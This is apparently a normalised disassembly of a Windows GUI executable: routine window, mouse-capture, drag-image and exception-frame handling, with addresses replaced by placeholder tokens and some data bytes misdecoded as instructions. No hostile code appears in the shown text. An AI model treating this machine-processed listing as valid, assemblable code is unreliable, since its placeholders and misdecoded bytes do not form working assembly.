add eax 0xffffff8c
push eax
mov eax [ eax ]
mov eax [ eax + 0x1c ]
xchg [ esp ] eax
retn
sub_431d94
add eax 0xffffff8c
jmp sub_43f5dc
sub_431d9c
add [ esp + 0x4 ] 0xffffff8c
jmp sub_405808
sub_431da6
add [ esp + 0x4 ] 0xffffff8c
jmp sub_405830
sub_431db0
add [ esp + 0x4 ] 0xffffff8c
jmp sub_405844
sub_431eec
mov dl [ eax ]
sub dl 0x1
jb r-xdata
mov [ eax ] 0x1
retn
je r-xdata
mov [ eax ] 0x0
jmp r-xdata
retn
sub_4321ff
inc [ esi ]
add [ eax ] al
add [ ebx + 0x72 ] ah
push ebx
imul edi [ edx + 0x65 ] 0x156a0000
mov ecx rw-data
call sub_4165c8
retn
sub_43221c
push 0x15
mov ecx rw-data
call sub_416588
retn
sub_4322b4
call GetCapture
call sub_431fec
test eax eax
je r-xdata
retn
cmp [ rw-data ] 0x0
je r-xdata
mov edx [ rw-data ]
cmp eax [ edx + 0x30 ]
jne r-xdata
mov eax [ rw-data ]
sub_432518
push ebx
push eax
push sub_43269c
call sub_41d604
mov ebx eax
push ebx
call SetCapture
mov eax ebx
pop ebx
retn
sub_432530
push ebp
mov ebp esp
pop ebp
retn 0x8
sub_432560
push ebx
mov ebx edx
call ReleaseCapture
mov eax ebx
call sub_41d6b8
pop ebx
retn
sub_43263e
jmp sub_4035ec
sub_432670
xor eax eax
retn
sub_432674
push ebp
mov ebp esp
test dl dl
je r-xdata
mov ax 0xfff3
mov ax 0xfff4
jmp r-xdata
pop ebp
retn 0x4
sub_43268c
retn
sub_432690
mov eax [ rw-data ]
retn
sub_432698
retn
sub_4326c6
jmp sub_4035ec
sub_4326cb
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_454884
call sub_403954
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4326e8
call sub_4033a4
xor eax eax
mov [ rw-data ] eax
retn
sub_4326f8
call sub_4033a0
xor eax eax
mov [ rw-data ] eax
retn
sub_432708
test dl dl
je r-xdata
mov [ eax + 0x38 ] ecx
test dl dl
je r-xdata
add esp 0xfffffff0
call sub_403470
retn
call sub_4034c8
pop [ fs : 0x0 ]
add esp 0xc
sub_4327b8
push ebp
mov ebp esp
test dl dl
je r-xdata
mov ax 0xfff3
mov eax [ eax + 0x38 ]
mov ax [ eax + 0x7a ]
jmp r-xdata
pop ebp
retn 0x4
sub_4327d0
mov eax [ eax + 0x38 ]
mov edx [ eax ]
call [ edx + 0x4c ]
retn
sub_43281c
retn
sub_4329d4
push esi
mov esi eax
mov edx esi
mov eax [ esi + 0x38 ]
mov si 0xffdb
call sub_403360
pop esi
retn
sub_4329e8
push esi
mov esi eax
mov edx esi
mov eax [ esi + 0x38 ]
mov si 0xffda
call sub_403360
pop esi
retn
sub_4329fc
push ebp
mov ebp esp
xor eax eax
pop ebp
retn 0x4
sub_432a08
mov eax 0x4
retn
sub_432a10
retn
sub_433601
jmp sub_4035ec
sub_4338ee
jmp sub_4038a0
sub_433960
jmp sub_4038a0
sub_43396c
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
mov [ rw-data ] eax
retn
xor eax eax
call sub_433694
sub_433aeb
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
call sub_4202b8
retn
sub_433b01
jmp sub_4038a0
sub_433b28
jmp sub_4038a0
sub_433baa
jmp sub_4038a0
sub_433bd2
jmp sub_4038a0
sub_433bd9
mov esp ebp
pop ebp
retn
sub_433c91
jmp sub_4038a0
sub_433ce8
push ebx
push esi
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x58 ]
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_433cb4
mov [ ebx + 0x58 ] esi
sub_433e3c
push ebx
cmp [ eax + 0x1a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1c ]
call [ ebx + 0x18 ]
sub_433e50
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_403314
mov [ ebx + 0x18 ] eax
pop esi
pop ebx
retn
sub_433f39
jmp sub_4038a0
sub_433f40
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_433fc3
jmp sub_4038a0
sub_433fca
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
sub_434398
xor eax eax
retn
sub_43439c
mov al [ eax + 0x58 ]
retn
sub_4343a0
xor eax eax
retn
sub_4343a4
cmp [ eax + 0x30 ] 0x0
setne al
retn
sub_4343ac
mov eax [ eax + 0x30 ]
retn
sub_434450
mov edx [ eax + 0x6c ]
test edx edx
je r-xdata
xor eax eax
retn
mov eax [ edx + 0x10 ]
retn
sub_4344fc
push ebx
mov ebx eax
xor eax eax
mov al [ ebx + 0x5b ]
mov al [ eax + rw-data ]
cmp al [ ebx + 0x61 ]
setne al
pop ebx
retn
sub_434514
mov [ eax + 0x5d ] dl
retn
sub_434518
mov edx [ eax + 0x30 ]
test edx edx
je r-xdata
retn
xchg edx eax
call sub_4380ec
sub_434528
push ebx
cmp [ eax + 0xfa ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0xfc ]
call [ ebx + 0xf8 ]
sub_434a0b
jmp sub_4038a0
sub_434a12
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_434a74
test [ eax + 0x1c ] 0x1
jne r-xdata
mov [ eax + 0x158 ] edx
retn
mov [ eax + 0x150 ] 0x1
sub_434af8
xor ecx ecx
mov [ edx ] ecx
xor ecx ecx
mov [ edx + 0x4 ] ecx
mov ecx [ eax + 0x48 ]
mov [ edx + 0x8 ] ecx
mov eax [ eax + 0x4c ]
mov [ edx + 0xc ] eax
retn
sub_434c15
jmp sub_4038a0
sub_434c1c
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_434d18
push eax
xor ecx ecx
mov edx 0xb037
call sub_4362b4
retn
sub_434ed9
add [ eax ] al
add [ esi + 0x3a ] dl
push eax
pop esp
je r-xdata
pop esi
retn
mov [ eax + 0x5c ] dl
test dl dl
je r-xdata
mov si 0xffee
call sub_403360
sub_434f8a
jmp sub_4038a0
sub_434f91
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_435068
cmp dl [ eax + 0x58 ]
je r-xdata
retn
mov [ eax + 0x58 ] dl
push 0x0
xor ecx ecx
mov edx 0xb00c
call sub_4362b4
sub_435080
push 0x0
xor ecx ecx
mov edx 0xe
call sub_4362b4
retn
sub_435090
push edx
mov edx 0xd
call sub_4362b4
retn
sub_43509c
mov edx [ eax + 0xac ]
test edx edx
jle r-xdata
mov eax [ eax + 0x4c ]
retn
mov eax edx
retn
sub_4350b0
mov edx [ eax + 0xa8 ]
test edx edx
jle r-xdata
mov eax [ eax + 0x48 ]
retn
mov eax edx
retn
sub_435191
jmp sub_4038a0
sub_435198
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4351a0
cmp dl [ eax + 0x5f ]
je r-xdata
retn
mov [ eax + 0x5f ] dl
mov [ eax + 0x60 ] 0x0
push 0x0
xor ecx ecx
mov edx 0xb03c
call sub_4362b4
sub_435210
cmp [ eax + 0x59 ] 0x0
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x56 ] 0x0
je r-xdata
mov al 0x1
retn
sub_435224
mov al [ eax + 0x9a ]
xor al 0x1
retn
sub_435230
mov al [ eax + 0x60 ]
xor al 0x1
retn
sub_435238
cmp dl [ eax + 0x59 ]
je r-xdata
retn
mov [ eax + 0x59 ] dl
cmp [ eax + 0x30 ] 0x0
je r-xdata
test [ eax + 0x1c ] 0x2
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb008
call sub_4362b4
sub_43525c
cmp dl [ eax + 0x99 ]
je r-xdata
retn
mov [ eax + 0x99 ] dl
mov [ eax + 0x9a ] 0x0
push 0x0
xor ecx ecx
mov edx 0xb022
call sub_4362b4
sub_435280
cmp dl [ eax + 0x9a ]
je r-xdata
retn
mov [ eax + 0x9a ] dl
cmp [ eax + 0x30 ] 0x0
je r-xdata
test [ eax + 0x1c ] 0x2
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb023
call sub_4362b4
sub_4352c8
mov al [ eax + 0x5a ]
xor al 0x1
retn
sub_4352d0
cmp dl [ eax + 0x5a ]
je r-xdata
retn
mov [ eax + 0x5a ] dl
cmp [ eax + 0x30 ] 0x0
je r-xdata
test [ eax + 0x1c ] 0x2
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb009
call sub_4362b4
sub_4352f4
cmp dl [ eax + 0x60 ]
je r-xdata
retn
mov [ eax + 0x60 ] dl
cmp [ eax + 0x30 ] 0x0
je r-xdata
test [ eax + 0x1c ] 0x2
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb03d
call sub_4362b4
sub_435318
cmp dx [ eax + 0x78 ]
je r-xdata
retn
mov [ eax + 0x78 ] dx
push 0x0
xor ecx ecx
mov edx 0xb00f
call sub_4362b4
sub_435334
push ebx
mov ebx eax
call sub_4322b4
cmp ebx eax
sete al
pop ebx
retn
sub_43536c
push esi
mov dl 0x1
mov si 0xffce
call sub_403360
pop esi
retn
sub_4354b6
jmp sub_4038a0
sub_4354bd
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4355e0
test [ eax + 0x50 ] 0x40
setne cl
mov dl [ eax + 0x57 ]
call sub_435554
retn
sub_435634
push esi
mov esi [ eax + 0x30 ]
test esi esi
je r-xdata
pop esi
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x88 ]
sub_435721
jmp sub_4038a0
sub_435740
xor eax eax
retn
sub_435744
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x5f ] 0x0
jne r-xdata
mov al 0x1
retn
sub_43575c
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x5f ] 0x1
je r-xdata
mov al 0x1
retn
sub_435774
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
mov al [ eax + 0x5f ]
dec eax
sub al 0x2
jb r-xdata
mov al 0x1
retn
sub_435790
mov edx [ rw-data ]
mov ecx [ edx + 0x8 ]
mov edx [ rw-data ]
mov dl [ edx + 0x4 ]
call sub_4357a8
retn
sub_43586c
retn
sub_435870
cmp eax [ rw-data ]
sete al
retn
sub_4358e4
push ebx
cmp [ eax + 0x112 ] 0x0
je r-xdata
pop ebx
retn
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x114 ]
call [ ebx + 0x110 ]
sub_435a00
push ebp
mov ebp esp
push esi
mov si 0xffd2
call sub_403360
pop esi
pop ebp
retn 0x4
sub_435a40
push ebx
cmp [ eax + 0x102 ] 0x0
je r-xdata
pop ebx
retn
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x104 ]
call [ ebx + 0x100 ]
sub_435cd7
jmp sub_4038a0
sub_435cde
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_435ce8
push esi
mov esi eax
xor ecx ecx
mov eax esi
mov si 0xffe8
call sub_403360
pop esi
retn
sub_435cfc
push esi
mov esi eax
mov cl 0x1
mov eax esi
mov si 0xffe8
call sub_403360
pop esi
retn
sub_435fcb
jmp sub_4038a0
sub_436074
push esi
mov si 0xffee
call sub_403360
pop esi
retn
sub_436080
mov al 0x1
retn
sub_436358
mov ecx [ edx ]
mov [ eax + 0x40 ] ecx
mov ecx [ edx + 0x4 ]
mov [ eax + 0x44 ] ecx
mov ecx [ edx + 0x8 ]
sub ecx [ edx ]
mov [ eax + 0x48 ] ecx
mov ecx [ edx + 0xc ]
sub ecx [ edx + 0x4 ]
mov [ eax + 0x4c ] ecx
call sub_434760
retn
sub_43637c
retn
sub_436595
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + 0x56 ] dl
mov esi edx
mov ebx eax
mov eax esi
call sub_419dd4
mov [ ebx + 0x5e ] al
pop esi
pop ebx
retn
sub_4365b0
mov al [ eax + 0x5e ]
xchg edx eax
call sub_41c10c
retn
sub_4366a8
push ebx
cmp [ eax + 0x12a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x12c ]
call [ ebx + 0x128 ]
sub_436cc0
mov edx [ eax ]
call [ edx + 0x7c ]
retn
sub_436cc8
mov edx [ eax ]
call [ edx + 0x7c ]
retn
sub_436cd0
mov edx [ eax ]
call [ edx + 0x7c ]
retn
sub_436d88
push esi
mov esi eax
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
pop esi
retn
cmp [ edx + 0x4 ] 0x0
jne r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_436da8
push ebx
mov ebx eax
cmp [ ebx + 0x9a ] 0x0
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x30 ]
mov dl [ eax + 0x99 ]
mov eax ebx
call sub_43525c
mov [ ebx + 0x9a ] 0x1
sub_436e00
push ebx
mov ebx eax
cmp [ ebx + 0x56 ] 0x0
je r-xdata
pop ebx
retn
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x84 ]
mov eax ebx
call sub_435200
mov [ ebx + 0x56 ] 0x1
sub_436e24
mov [ edx + 0xc ] 0x1
retn
sub_436e2c
mov edx [ eax + 0x30 ]
test edx edx
je r-xdata
retn
push eax
xor ecx ecx
mov eax edx
mov edx 0xb013
call sub_4362b4
sub_436e44
mov edx [ eax + 0x30 ]
test edx edx
je r-xdata
retn
push eax
xor ecx ecx
mov eax edx
mov edx 0xb014
call sub_4362b4
sub_436e5c
xor eax eax
mov [ edx + 0xc ] eax
retn
sub_4370c2
jmp sub_4038a0
sub_4370c9
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4370f4
mov eax [ r-xdata ]
retn
sub_437290
jmp sub_4038a0
sub_437297
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4373b8
mov eax [ eax + 0xb8 ]
retn
sub_437420
push ebx
mov ebx eax
mov eax ebx
call sub_435744
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax 0x20000
pop ebx
retn
sub_43743c
mov edx [ eax + 0x6c ]
test edx edx
je r-xdata
retn
mov eax edx
mov edx [ eax ]
call [ edx + 0x1c ]
sub_4375d4
mov eax [ eax + 0x74 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
sub_437604
mov edx [ eax ]
call [ edx + 0x34 ]
retn
sub_43760c
call sub_4341cc
retn
sub_43770c
jmp sub_4038a0
sub_4378cc
jmp sub_4038a0
sub_43791c
jmp sub_4038a0
sub_437954
retn
sub_437bdd
jmp sub_4038a0
sub_437d65
jmp sub_4038a0
sub_4380c7
jmp sub_4038a0
sub_438173
jmp sub_4038a0
sub_438180
inc [ eax + 0x160 ]
retn
sub_438188
dec [ eax + 0x160 ]
cmp [ eax + 0x160 ] 0x0
jne r-xdata
retn
test [ eax + 0x54 ] 0x10
je r-xdata
call sub_4381a8
sub_4381a8
xor edx edx
call sub_4380ec
retn
sub_438275
jmp sub_4038a0
sub_43827c
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43836b
jmp sub_4038a0
sub_438892
jmp sub_4038a0
sub_438899
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_438a61
jmp sub_4038a0
sub_438a68
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_438b3c
mov ecx [ eax ]
cmp ecx [ edx ]
jne r-xdata
xor eax eax
retn
mov eax [ eax + 0x4 ]
cmp eax [ edx + 0x4 ]
je r-xdata
mov al 0x1
retn
sub_438d29
jmp sub_4038a0
sub_438d30
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x180 ] edx
pop ecx
pop ebp
retn
sub_438e20
xor eax eax
retn
sub_438e88
cmp [ eax + 0x180 ] 0x0
je r-xdata
retn
push 0x0
xor ecx ecx
mov edx 0xb033
call sub_4362b4
sub_438fb6
jmp sub_4035ec
sub_4390eb
jmp sub_4038a0
sub_4390f2
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4390fc
jmp sub_4035ec
sub_439101
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_454884
call sub_403954
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4396bc
jmp sub_4038a0
sub_4396c3
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4396cc
add esp 0xfffffff0
mov [ esp ] 0xf
mov [ esp + 0x4 ] edx
xor edx edx
mov [ esp + 0x8 ] edx
xor edx edx
mov [ esp + 0xc ] edx
mov edx esp
mov ecx [ eax ]
call [ ecx - 0x10 ]
add esp 0x10
retn
sub_439bca
jmp sub_4038a0
sub_439c1c
push ebx
mov ebx eax
call sub_41eb48
push 0x0
xor ecx ecx
mov edx 0xb024
mov eax ebx
call sub_4362b4
pop ebx
retn
sub_439c38
mov ecx [ edx + 0x8 ]
push ecx
mov ecx [ edx + 0x4 ]
mov edx 0xb025
call sub_4362b4
retn
sub_439c4c
push 0x0
xor ecx ecx
mov edx 0xb026
call sub_4362b4
retn
sub_439c5c
push 0x0
xor ecx ecx
mov edx 0xb027
call sub_4362b4
retn
sub_439f08
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
call sub_43bbf8
pop esi
retn
sub_43a01c
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
call sub_43a06c
pop esi
retn
sub_43a030
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
call sub_43a158
pop esi
retn
sub_43a044
push esi
mov esi eax
mov [ esi + 0x1f9 ] 0x1
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
retn
sub_43a058
push esi
mov esi eax
mov [ esi + 0x1f9 ] 0x0
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
retn
sub_43a14b
jmp sub_4038a0
sub_43a152
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_43a1e2
jmp sub_4038a0
sub_43a1e9
pop ebx
pop ecx
pop ebp
retn
sub_43a1f0
push esi
mov esi edx
mov edx eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x68 ]
pop esi
retn
sub_43a200
retn
sub_43a204
push ebx
cmp [ eax + 0x1c2 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1c4 ]
call [ ebx + 0x1c0 ]
sub_43a224
push ebx
cmp [ eax + 0x1ca ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1cc ]
call [ ebx + 0x1c8 ]
sub_43a384
mov edx [ eax + 0x178 ]
test edx edx
je r-xdata
xor eax eax
retn
mov eax [ edx + 0x8 ]
retn
sub_43a454
retn
sub_43a56c
jmp sub_4038a0
sub_43a573
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_43a63e
jmp sub_4038a0
sub_43a668
xor ecx ecx
mov [ edx + 0xc ] ecx
cmp [ eax + 0x1a7 ] 0x0
je r-xdata
retn
cmp [ eax + 0x17c ] 0x0
je r-xdata
mov edx [ edx + 0x8 ]
mov eax [ eax + 0x17c ]
mov ecx [ eax ]
call [ ecx + 0x28 ]
sub_43a6fa
jmp sub_4038a0
sub_43a8cc
push ebx
cmp [ eax + 0x1e2 ] 0x0
je r-xdata
pop ebx
retn
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1e4 ]
call [ ebx + 0x1e0 ]
sub_43ab70
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
xor eax eax
mov [ esi + 0x180 ] eax
mov [ esi + 0x1a6 ] 0x0
pop esi
retn
sub_43ac4c
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov dx 0xb023
mov eax esi
call sub_438678
pop esi
retn
sub_43ad10
push esi
mov si 0xffc1
call sub_403360
pop esi
retn
sub_43ad3c
push ebx
mov ecx [ eax + 0x30 ]
test ecx ecx
je r-xdata
pop ebx
retn
mov ebx ecx
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_43ad50
push ebx
mov ecx [ eax + 0x30 ]
test ecx ecx
je r-xdata
pop ebx
retn
mov ebx ecx
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_43ad64
call sub_438638
retn
sub_43ad6c
call sub_438638
retn
sub_43ad74
call sub_438638
retn
sub_43ae1c
push ebx
mov ebx eax
mov eax ebx
call sub_436cd0
mov edx [ ebx + 0x70 ]
mov eax [ ebx + 0x170 ]
call sub_41fcc0
mov dx 0xb009
mov eax ebx
call sub_438678
pop ebx
retn
sub_43af80
call sub_438638
retn
sub_43af88
call sub_438638
retn
sub_43af90
call sub_438638
retn
sub_43af98
call sub_438638
retn
sub_43affc
push ebx
mov ecx [ eax + 0x30 ]
test ecx ecx
je r-xdata
pop ebx
retn
mov ebx ecx
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_43b492
jmp sub_4038a0
sub_43b499
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_43b578
push esi
mov esi [ eax + 0x30 ]
test esi esi
je r-xdata
pop esi
retn
mov edx eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xc0 ]
sub_43b71c
push 0x0
xor ecx ecx
mov edx 0xb034
call sub_4362b4
retn
sub_43b7bc
push ebx
mov ebx eax
mov eax ebx
call sub_43bbec
test al al
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x180 ]
push eax
call UpdateWindow
sub_43b7d8
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x88 ]
pop ebx
retn
sub_43b9b0
push ebx
push esi
mov esi edx
mov ebx eax
push esi
mov eax ebx
call sub_43b8e8
push eax
call GetClientRect
pop esi
pop ebx
retn
sub_43ba08
cmp edx [ eax + 0x16c ]
je r-xdata
retn
mov [ eax + 0x16c ] edx
push 0x0
xor ecx ecx
mov edx 0xb03b
call sub_4362b4
sub_43ba28
cmp dl [ eax + 0x1a5 ]
je r-xdata
retn
mov [ eax + 0x1a5 ] dl
mov [ eax + 0x1a9 ] 0x0
push 0x0
xor ecx ecx
mov edx 0xb010
call sub_4362b4
sub_43ba4c
mov al [ eax + 0x1a9 ]
xor al 0x1
retn
sub_43ba58
cmp dl [ eax + 0x1a9 ]
je r-xdata
retn
mov [ eax + 0x1a9 ] dl
cmp [ eax + 0x30 ] 0x0
je r-xdata
test [ eax + 0x1c ] 0x2
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb011
call sub_4362b4
sub_43bb04
test [ eax + 0x54 ] 0x8
je r-xdata
call sub_43baa8
retn
movsx edx dx
mov [ eax + 0x1a0 ] edx
retn
sub_43bbe0
jmp sub_4038a0
sub_43bbe7
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_43be06
jmp sub_4038a0
sub_43be0d
mov eax [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_43bf14
call sub_436084
retn
sub_43c362
jmp sub_4038a0
sub_43c3f8
mov eax [ r-xdata ]
retn
sub_43c55f
jmp sub_4038a0
sub_43c8f2
jmp sub_4038a0
sub_43ca34
test [ eax + 0x52 ] 0x4
setne al
retn
sub_43cb90
jmp sub_4038a0
sub_43cb97
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
call sub_4202b8
retn
sub_43cbb3
jmp sub_4038a0
sub_43cbc0
retn
sub_43cc94
mov [ edx + 0xc ] 0xffffffff
retn
sub_43ccf2
jmp sub_4038a0
sub_43ccf9
pop ecx
pop ecx
pop ebp
retn
sub_43cd99
jmp sub_4038a0
sub_43cda0
pop ebx
mov esp ebp
pop ebp
retn
sub_43ce0c
call sub_438e40
retn
sub_43ce9f
jmp sub_4038a0
sub_43cea6
pop esi
pop ecx
pop ecx
pop ebp
retn
sub_43d085
jmp sub_4038a0
sub_43d08c
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43d2a8
jmp sub_4038a0
sub_43d2fc
cmp dx [ eax + 0x68 ]
je r-xdata
retn
mov [ eax + 0x68 ] dx
cmp [ eax + 0x6a ] 0x0
je r-xdata
call sub_43d1e8
sub_43d440
push ebx
mov ebx eax
mov eax ebx
call sub_441e68
test al al
je r-xdata
pop ebx
retn
push 0xffffffff
call ImageList_DragShowNolock
sub_43d458
push ebx
mov ebx eax
mov eax ebx
call sub_441e68
test al al
je r-xdata
pop ebx
retn
push 0x0
call ImageList_DragShowNolock
sub_43d544
push ebx
push esi
mov esi edx
mov ebx eax
or [ ebx + 0x54 ] 0x100
mov edx esi
mov eax ebx
call sub_439a78
and [ ebx + 0x54 ] 0xfeff
pop esi
pop ebx
retn
sub_43d5df
jmp sub_4038a0
sub_43d5e6
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43d609
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_4202b8
retn
sub_43d602
jmp sub_4038a0
sub_43d609
pop ebx
pop ecx
pop ebp
retn
sub_43d610
retn
sub_43d678
xor edx edx
mov eax [ eax + 0x8 ]
test eax eax
je r-xdata
mov eax edx
retn
mov eax [ eax + 0xc ]
inc edx
test eax eax
jne r-xdata
sub_43d9e5
jmp sub_4038a0
sub_43dbcc
mov eax [ eax + 0x8 ]
jmp r-xdata
mov edx [ eax + 0xc ]
test edx edx
jne r-xdata
mov eax edx
retn
sub_43ddb8
jmp sub_4038a0
sub_43de68
mov eax [ eax + 0x14 ]
mov al [ eax + 0x5b ]
dec eax
sub al 0x2
jae r-xdata
add [ ecx + 0x4 ] 0xc
retn
add [ ecx ] 0xc
retn
sub_43de7c
inc [ eax + 0x6c ]
retn
sub_43de80
dec [ eax + 0x6c ]
cmp [ eax + 0x6c ] 0x0
jg r-xdata
retn
xor edx edx
mov [ eax + 0x6c ] edx
call sub_43f700
sub_43dfe0
call sub_43e6e0
test eax eax
je r-xdata
xor eax eax
retn
mov eax [ eax + 0x4 ]
retn
sub_43e98b
jmp sub_4038a0
sub_43e992
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43e9af
lea eax [ ebp - 0xc ]
call sub_403e9c
retn
sub_43e9a8
jmp sub_4038a0
sub_43e9af
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43ec90
jmp sub_4038a0
sub_43ec97
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43ecb4
mov eax [ ebp - 0x4 ]
call sub_4202b8
retn
sub_43ecad
jmp sub_4038a0
sub_43ecb4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43ecd1
mov eax [ ebp - 0x4 ]
call sub_403164
retn
sub_43ecca
jmp sub_4038a0
sub_43ecd1
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43f185
jmp sub_4038a0
sub_43f18c
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43f317
jmp sub_4038a0
sub_43f31e
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_43f3d3
jmp sub_4038a0
sub_43f3da
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_43f4c8
jmp sub_4038a0
sub_43f519
jmp sub_4038a0
sub_43f520
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43f5dc
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_43deec
mov [ ebx + 0x38 ] eax
pop esi
pop ebx
retn
sub_43f728
cmp [ eax + 0x6c ] 0x0
jne r-xdata
retn
mov eax edx
call sub_43da28
sub_440028
jmp sub_4038a0
sub_44002f
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4400f8
call GetCapture
retn
sub_440100
push ebx
mov ebx edx
push ebx
call GetCursorPos
call sub_40c88c
pop ebx
retn
sub_440110
push ebx
mov ebx eax
push 0x13
mov eax [ rw-data ]
mov eax [ eax ]
call eax
cmp eax 0x1
sbb eax eax
inc eax
mov [ ebx + 0xc ] al
pop ebx
retn
sub_440376
jmp sub_4038a0
sub_440570
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
retn
push eax
call [ rw-data ]
retn
sub_440784
jmp sub_4038a0
sub_44078b
pop ebx
mov esp ebp
pop ebp
retn
sub_440837
jmp sub_4038a0
sub_44083e
pop ebp
retn
sub_4408c6
jmp sub_4038a0
sub_4408cd
pop ebp
retn
sub_440a5c
inc eax
int3
sub_440df8
mov edx [ eax + 0x5c ]
test edx edx
je r-xdata
or eax 0xffffffff
retn
mov edx [ edx + 0x30 ]
xchg edx eax
call sub_416b74
retn
sub_440e10
mov al 0x1
retn
sub_440e14
mov edx [ eax + 0x5c ]
test edx edx
je r-xdata
call sub_41c8e8
retn
mov eax edx
retn
sub_440e24
cmp [ eax + 0x5c ] 0x0
je r-xdata
call sub_41c8b8
retn
mov al 0x1
retn
sub_441114
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
